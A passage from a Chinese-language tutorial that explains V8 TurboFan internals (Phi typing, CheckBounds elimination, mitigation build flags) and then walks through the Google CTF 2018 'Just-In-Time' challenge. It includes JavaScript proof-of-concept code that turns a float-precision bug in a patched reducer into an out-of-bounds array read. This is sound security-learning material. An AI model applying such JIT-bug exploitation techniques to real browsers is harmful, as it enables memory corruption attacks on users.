<p>与之相应的，v8采用了SSA。因此对于一个Phi结点，它将设置该节点的Type为几个可能值的Range的并集。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::TypePhi(Node* node) &#123;</span><br><span class="line">  <span class="keyword">int</span> arity = node-&gt;op()-&gt;ValueInputCount();</span><br><span class="line">  Type type = Operand(node, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arity; ++i) &#123;</span><br><span class="line">    type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>请看以下示例：</p>
<p><img src="/2021/01/v8-turboFan/phi.png" alt="img"></p>
</li>
</ul>
<h3 id="4-SimplifiedLoweringPhase">4. SimplifiedLoweringPhase</h3>
<ul>
<li>
<p><code>SimplifiedLoweringPhase</code>会遍历结点做一些处理，同时也会对图做一些优化操作。</p>
<p>这里我们只关注该<code>Phase</code>优化<code>CheckBound</code>的细节，因为<code>CheckBound</code>通常是用于判断 JS数组（例如ArrayBuffer） 是否越界使用  所设置的结点。</p>
</li>
<li>
<p>首先我们可以通过以下路径来找到优化<code>CheckBound</code>的目标代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SimplifiedLoweringPhase::Run</span><br><span class="line">    SimplifiedLowering::LowerAllNodes</span><br><span class="line">      RepresentationSelector::Run</span><br><span class="line">        RepresentationSelector::VisitNode</span><br></pre></td></tr></table></figure>
<p>目标代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Dispatching routine for visiting the node &#123;node&#125; with the usage &#123;use&#125;.</span></span><br><span class="line">  <span class="comment">// Depending on the operator, propagate new usage info to the inputs.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VisitNode</span><span class="params">(Node* node, Truncation truncation,</span></span></span><br><span class="line"><span class="function"><span class="params">                SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Unconditionally eliminate unused pure nodes (only relevant if there's</span></span><br><span class="line">    <span class="comment">// a pure operation in between two effectful ones, where the last one</span></span><br><span class="line">    <span class="comment">// is unused).</span></span><br><span class="line">    <span class="comment">// Note: We must not do this for constants, as they are cached and we</span></span><br><span class="line">    <span class="comment">// would thus kill the cached &#123;node&#125; during lowering (i.e. replace all</span></span><br><span class="line">    <span class="comment">// uses with Dead), but at that point some node lowering might have</span></span><br><span class="line">    <span class="comment">// already taken the constant &#123;node&#125; from the cache (while it was in</span></span><br><span class="line">    <span class="comment">// a sane state still) and we would afterwards replace that use with</span></span><br><span class="line">    <span class="comment">// Dead as well.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;op()-&gt;ValueInputCount() &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        node-&gt;op()-&gt;HasProperty(Operator::kPure)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (truncation.IsUnused()) <span class="keyword">return</span> VisitUnused(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">case</span> IrOpcode::kCheckBounds: &#123;</span><br><span class="line">            <span class="keyword">const</span> CheckParameters&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">            Type index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">            Type length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">              <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">              <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">              <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">              VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                        MachineRepresentation::kWord32);</span><br><span class="line">              <span class="keyword">if</span> (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                PoisoningMitigationLevel::kDontPoison) &#123;</span><br><span class="line">                <span class="comment">// 可以看到，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界</span></span><br><span class="line">                <span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                    (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                    index_type.Max() &lt; length_type.Min())) &#123;</span><br><span class="line">                  <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">                  <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">                  <span class="comment">// CheckBound将会被优化</span></span><br><span class="line">                  DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              VisitBinop(</span><br><span class="line">                  node,</span><br><span class="line">                  UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),</span><br><span class="line">                  UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，在<code>CheckBound</code>的优化判断逻辑中，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界，此时将会移除<code>CheckBound</code>结点以简化IR图。</p>
<blockquote>
<p>需要注意NumberConstant结点的Type是一个Range类型，因此才会有最大值Max和最小值Min的概念。</p>
</blockquote>
</li>
<li>
<p>这里需要解释一下环境搭配中所说的，为什么要<strong>添加一个编译参数<code>v8_optimized_debug = false</code></strong>，注意看上面判断条件中的这行条件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                  PoisoningMitigationLevel::kDontPoison)</span><br></pre></td></tr></table></figure>
<p><code>visitNode</code>时有三个状态，分别是<code>Phase::PROPAGATE</code>（信息收集）、<code>Phase::RETYPE</code>（从类型反馈中获取类型）以及<code>Phase::LOWER</code>（开始优化）。当真正<strong>开始优化</strong>时，<code>lower()</code>条件自然成立，因此我们无需处理这个。</p>
<p>但对于下一个条件，通过动态调试可以得知，<code>poisoning_level</code>始终不为<code>PoisoningMitigationLevel::kDontPoison</code>。通过追溯<code>lowering-&gt;poisoning_level_</code>，我们可以发现它实际上在<code>PipelineCompilationJob::PrepareJobImpl</code>中被设置</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">PipelineCompilationJob::Status <span class="title">PipelineCompilationJob::PrepareJobImpl</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Isolate* isolate)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>FLAG_branch_load_poisoning</code>始终为<code>false</code>，<code>FLAG_untrusted_code_mitigations</code>始终为<code>true</code></p>
<blockquote>
<p>编译参数v8_untrusted_code_mitigations 默认 true，使得宏DISABLE_UNTRUSTED_CODE_MITIGATIONS没有被定义，因此默认设置<code>FLAG_untrusted_code_mitigations = true</code></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8/src/flag-definitions.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置`FLAG_untrusted_code_mitigations`</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DISABLE_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">DEFINE_BOOL(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,</span><br><span class="line">            <span class="string">"Enable mitigations for executing untrusted code"</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置`FLAG_branch_load_poisoning`</span></span><br><span class="line">DEFINE_BOOL(branch_load_poisoning, <span class="literal">false</span>, <span class="string">"Mask loads with branch conditions."</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BUILD.gn</span></span><br><span class="line">declare_args() &#123;</span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">  <span class="comment"># Enable mitigations for executing untrusted code.</span></span><br><span class="line">  <span class="comment"># 默认为true</span></span><br><span class="line">  v8_untrusted_code_mitigations = true</span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">if</span> (!v8_untrusted_code_mitigations) &#123;</span><br><span class="line">    defines += [ <span class="string">"DISABLE_UNTRUSTED_CODE_MITIGATIONS"</span> ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>这样就会使得<code>load_poisoning</code>始终为<code>PoisoningMitigationLevel::kPoisonCriticalOnly</code>，因此始终无法执行<code>checkBounds</code>的优化操作。所以我们需要手动设置编译参数<code>v8_untrusted_code_mitigations = false</code>，以启动checkbounds的优化。</p>
</li>
<li>
<p>以下是一个简单checkbounds优化的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>);</span><br><span class="line">  <span class="keyword">let</span> t = <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>优化前发现存在一个checkBounds：</p>
<p><img src="/2021/01/v8-turboFan/checkbounds1.png" alt="img"></p>
<p>执行完<code>SimplifiedLoweringPhase</code>后，<code>CheckBounds</code>被优化了:</p>
<p><img src="/2021/01/v8-turboFan/checkbounds2.png" alt="img"></p>
</li>
</ul>
<blockquote>
<p>基础概念介绍到这里，接下来我们学习一道CTF题来练练手。</p>
</blockquote>
<h2 id="六、Google-CTF-2018-final-Just-In-Time">六、Google CTF 2018(final) Just-In-Time</h2>
<h3 id="1-简介-2">1. 简介</h3>
<p>Google CTF 2018(final) Just-In-Time 是 v8 的一道基础题，适合用于v8即时编译的入门，其目标是执行<code>/usr/bin/gnome-calculator</code>以弹出计算器。在这里我们通过这道题目来学习一下v8的相关概念。</p>
<p>这道题的题解在安全客上有很多，但由于这是笔者初次接触 v8 的题，因此这次我们就详细讲一下其中的细节。</p>
<ul>
<li>题目来源 - <a href="https://ctftime.org/task/6982" target="_blank" rel="noopener">ctftime - task6982</a></li>
<li>Just-In-Time 官方附件及其exp - <a href="https://github.com/google/google-ctf/tree/master/2018/finals/pwn-just-in-time" target="_blank" rel="noopener">github</a></li>
</ul>
<h3 id="2-环境搭建">2. 环境搭建</h3>
<p>题目给的附件（ctftime中的附件，不是github上的附件）内含一个已编译好的chromium和两个patch文件。</p>
<ul>
<li><code>nosandbox.patch</code> : 该文件用于关闭renderer的沙箱机制。</li>
<li><code>addition-reducer.patch</code> : 本题的重头戏。</li>
<li><code>chromium</code> ：版本号为<code>70.0.3538.9</code>的二进制包（已打patch）</li>
</ul>
<p>不过由于笔者已经搭了v8的环境，因此决定采用源码编译的方式来编译出一个v8，这样的好处是<strong>可以更方便的进行调试</strong>。该题的v8版本为<strong>7.0.276.3</strong>，可以通过<code>chrome://version</code>来获取，或者去<a href="https://omahaproxy.appspot.com/" target="_blank" rel="noopener">OmahaProxy CSV Viewer</a>中查询。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开代理</span></span><br><span class="line">sudo service privoxy start</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="comment"># 切换chromium版本</span></span><br><span class="line"><span class="built_in">cd</span> v8/</span><br><span class="line">git checkout 7.0.276.3 <span class="comment"># 如果需要force，则添加-f参数。gclient同样如此。</span></span><br><span class="line">gclient sync <span class="comment"># 这一步需要代理（很重要）,需要N久,取决网速。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gclient sync完成后再打个patch</span></span><br><span class="line">git apply ../../../CTF/GoogleCTF2018_Just-In-Time/addition-reducer.patch</span><br><span class="line"><span class="comment"># 设置一下编译参数</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"><span class="comment"># 设置允许优化checkbounds</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"v8_untrusted_code_mitigations = false"</span> &gt;&gt; out.gn/x64.debug/args.gn</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为什么要设置<code>v8_untrusted_code_mitigations = false</code>，请查看上面关于<code>SimplifiedLoweringPhase</code>中checkbounds优化的简单讲解。</p>
<p>这里可能是因为出题者忘记给出v8的编译参数了，否则默认的编译参数将<strong>无法利用漏洞</strong>。</p>
</blockquote>
<h3 id="3-漏洞成因">3. 漏洞成因</h3>
<ul>
<li>
<p>新打的patch将在turboFan中的<code>TypedLoweringPhase</code>中添加了一种优化方式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">DuplicateAdditionReducer::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kNumberAdd:</span><br><span class="line">      <span class="keyword">return</span> ReduceAddition(node);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">DuplicateAdditionReducer::ReduceAddition</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), <span class="number">0</span>);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), <span class="number">0</span>);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  Node* left = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* right = NodeProperties::GetValueInput(node, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* parent_left = NodeProperties::GetValueInput(left, <span class="number">0</span>);</span><br><span class="line">  Node* parent_right = NodeProperties::GetValueInput(left, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> const1 = OpParameter&lt;<span class="keyword">double</span>&gt;(right-&gt;op());</span><br><span class="line">  <span class="keyword">double</span> const2 = OpParameter&lt;<span class="keyword">double</span>&gt;(parent_right-&gt;op());</span><br><span class="line">  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line"></span><br><span class="line">  NodeProperties::ReplaceValueInput(node, parent_left, <span class="number">0</span>);</span><br><span class="line">  NodeProperties::ReplaceValueInput(node, new_const, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Changed(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该优化方式将优化诸如<code>x + 1 + 2</code>这类的表达式为<code>x + 3</code>，即以下的Case4：</p>
<p><img src="/2021/01/v8-turboFan/schema_vuln_ctf.png" alt="img"></p>
</li>
<li>
<p>但是，还记得我们之前所提到的，NumberConstant的内部实现使用的是<code>double</code>类型。这就意味着这样的优化可能存在精度丢失。举个例子：</p>
<p><img src="/2021/01/v8-turboFan/JStest.png" alt="img"></p>
<p>即，<code>x + 1 + 1</code>不一定会等于<code>x + 2</code>！所以这种优化是存在问题的。</p>
</li>
<li>
<p>这是为什么呢？原因是浮点数的IEEE764标准。当一个浮点数越来越大时，有限的空间只能保留高位的数据，因此一旦浮点数的值超过某个界限时，低位数值将被舍弃，此时数值不能全部表示，存在精度丢失。</p>
<p>而这个界限正是 $2^{53}-1 = 9007199254740991$，即上图中的<code>MAX_sAFE_INTEGER</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下是double结构的9007199254740991值，可以看到正好是double结构所能存放的最大整数。</span></span><br><span class="line">+------+--------------+------------------------------------------------------+‭</span><br><span class="line">| sign |    exponent  |                fraction                              |</span><br><span class="line">+------+--------------+------------------------------------------------------+</span><br><span class="line">|   <span class="number">0</span>  |  <span class="number">00000000001</span> | <span class="number">1111111111111111111111111111111111111111111111111111</span>‬ |</span><br><span class="line">+------+--------------+------------------------------------------------------+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于<code>x + 1 + 1 &lt;= x + 2</code>，因此某个<code>NumberAdd</code>结点的<code>Type</code>，也就是<strong>其Range将会小于该结点本身的值</strong> 。例如</p>
<ul>
<li><code>9007199254740992</code> 连续两次 <strong>+1</strong> 后，由于精度丢失，导致最后一个<code>NumberAdd</code>结点的Type为<code>Range(9007199254740992,9007199254740992)</code>。</li>
<li>但由于执行了patch中的优化，导致最后一个加法操作实际的结果为<code>9007199254740994</code>，大于Range的最大值。</li>
<li>因此，如果使用这个结果值来访问数组的话，可能存在越界读写的问题，因为若预期index小于length的最小范围时，checkBounds结点将会被优化，此时比<strong>预期index</strong> 范围更大的 <strong>实际index</strong> 很有可能成功越界。</li>
</ul>
</li>
</ul>
<h3 id="4-漏洞利用">4. 漏洞利用</h3>
<h4 id="a-OOB">a. OOB</h4>
<h5 id="1-构造POC">1) 构造POC</h5>
<ul>
<li>
<p>我们先试一下POC</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>]; <span class="comment">// length =&gt; Range(5, 5)</span></span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    <span class="comment">// 此时 t =&gt; 解释/编译 Range(9007199254740989, 9007199254740992)</span></span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(9007199254740991, 9007199254740992)</span></span><br><span class="line"><span class="comment">        编译：Range(9007199254740991, 9007199254740994)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="comment">/* 此时 t =&gt; </span></span><br><span class="line"><span class="comment">        解释：Range(2, 3)</span></span><br><span class="line"><span class="comment">        编译：Range(2, 5)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>Type后的结果如下，可以看到checkbounds的检查可以通过：</p>
<p><img src="/2021/01/v8-turboFan/poc_1.png" alt="img"></p>
<p>因此该checkbounds将在<code>SimplifiedLoweringPhase</code>中被优化：</p>
<p><img src="/2021/01/v8-turboFan/poc_2.png" alt="img"></p>
<p>输出的结果如下：</p>
<blockquote>
<p>注：输出结果中的<code>DuplicateAdditionReducer::ReduceAddition Called/Success</code>，是打patch后的输出内容，在原v8中没有该输出。</p>
</blockquote>
<p><img src="/2021/01/v8-turboFan/ctfoutput1.png" alt="img"></p>
<p>可以看到，成功将两个+1操作优化为+2，并在最末尾处成功<strong>越界读取</strong>到一个数组外的元素。</p>
</li>
<li>
<p>这里需要说一下构建poc可能存在的问题：</p>
<ul>
<li>
<p>POC1：<strong>无 if 分支</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="comment">// 这里没有使用上面if xxx这样的语句，直接一个整数赋值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// let t = Number.MAX_SAFE_INTEGER + 1; </span></span><br><span class="line">    <span class="keyword">let</span> t = <span class="number">9007199254740992</span>; </span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740989</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：由于函数中常数与常数相加减，因此在执行<code>TypedLoweringPhase</code>中的<code>ConstantFoldingReducer</code>时，三个算数表达式会直接优化为一个常数，这样就没办法执行<code>DuplicateAdditionReducer</code>。</p>
<p><img src="/2021/01/v8-turboFan/poc1.png" alt="img"></p>
<p><strong>解决方法</strong>：使用一个<code>if</code>分支，这样就可以通过<code>phi</code>结点来间接设置<code>Range</code>。</p>
</li>
</ul>
<blockquote>
<p>以下是一些玄学问题。</p>
</blockquote>
<ul>
<li>
<p>POC2：<strong>使用<code>Number.MAX_SAFE_INTEGER</code></strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">        : <span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p><strong>问题点</strong>：在<code>GraphBuilderPhase</code>中，type feedback推测目标函数的参数只会为<code>1</code>，因此turboFan推测函数中的条件判断式 <strong>“恒”成立</strong> ，故在<code>InliningPhase</code>中优化<code>merge</code>结点，使得变量<code>t</code>始终为一个常数。</p>
<p><img src="/2021/01/v8-turboFan/poc2_1.png" alt="img"></p>
<p>之后就执行<code>TypedLoweringPhase</code>中的<code>ConstantFoldingReducer</code>再次将其优化为一个常数，以至于无法执行<code>DuplicateAdditionReducer</code>优化。</p>
<p>通过turbolizer我们可以看出，若判断条件为真，则将优化好的结果输出；若判断条件为假，则说明type feedback出现错误，需要执行deopt。</p>
<p><img src="/2021/01/v8-turboFan/poc2.png" alt="img"></p>
<blockquote>
<p>至于为什么先前的poc不会优化merge结点，而当前这个poc会优化merge结点，</p>
<p>这个问题仍然需要进一步探索。</p>
</blockquote>
<p><strong>解决方法</strong>：</p>
<ol>
<li>
<p>不同时在 if 语句的两个分支处使用<code>Number.MAX_SAFE_INTEGER</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">        <span class="comment">// 修改了此处</span></span><br><span class="line">        : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在执行<code>%OptimizeFunctionOnNextCall</code>前，使函数调用传入的参数<strong>不单一</strong>:</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span> </span><br><span class="line">          : <span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= (<span class="built_in">Number</span>.MAX_SAFE_INTEGER - <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">0</span>));  <span class="comment">// 添加了此行</span></span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<p>POC3：<strong>不使用<code>let/var/const</code>修饰词</strong></p>
